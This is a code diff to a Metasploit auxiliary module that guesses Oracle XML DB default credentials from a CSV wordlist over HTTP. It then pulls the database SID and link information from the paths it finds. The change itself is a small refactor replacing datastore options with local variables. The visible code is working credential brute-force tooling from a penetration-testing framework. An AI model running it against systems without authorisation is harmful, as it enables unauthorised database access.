@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -34,7 +32,6 @@ class Metasploit3 < Msf::Auxiliary
           OptString.new('CSVFILE', [ false, 'The file that contains a list of default accounts.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'oracle_default_passwords.csv')]),
           Opt::RPORT(8080),
         ], self.class)
-    deregister_options('DBUSER','DBPASS')
   end
 
   def run_host(ip)
@@ -59,9 +56,9 @@ class Metasploit3 < Msf::Auxiliary
 
     fd = CSV.foreach(list) do |brute|
 
-      datastore['DBUSER'] = brute[2].downcase
-      datastore['DBPASS'] = brute[3].downcase
-      user_pass = "#{datastore['DBUSER']}:#{datastore['DBPASS']}"
+      dbuser = brute[2].downcase
+      dbpass = brute[3].downcase
+      user_pass = "#{dbuser}:#{dbpass}"
 
       res = send_request_raw({
         'uri'     => '/oradb/PUBLIC/GLOBAL_NAME',
@@ -74,7 +71,7 @@ class Metasploit3 < Msf::Auxiliary
       }, 10)
 
       if( not res )
-        vprint_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...")
+        vprint_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{dbuser} / #{dbpass}...")
         next
       end
       if (res.code == 200)
@@ -91,10 +88,10 @@ class Metasploit3 < Msf::Auxiliary
           :data => sid,
           :update => :unique_data
         )
-        print_good("Discovered SID: '#{sid[0]}' for host #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}")
+        print_good("Discovered SID: '#{sid[0]}' for host #{ip}:#{datastore['RPORT']} with #{dbuser} / #{dbpass}")
         users.push(user_pass)
       else
-        vprint_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...")
+        vprint_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{dbuser} / #{dbpass}...")
       end
     end #fd.each
 
@@ -179,7 +176,7 @@ class Metasploit3 < Msf::Auxiliary
         end
       end
 
-      #database links
+      # database links
       res = send_request_raw({
         'uri'     => '/oradb/PUBLIC/ALL_DB_LINKS',
         'version' => '1.1',
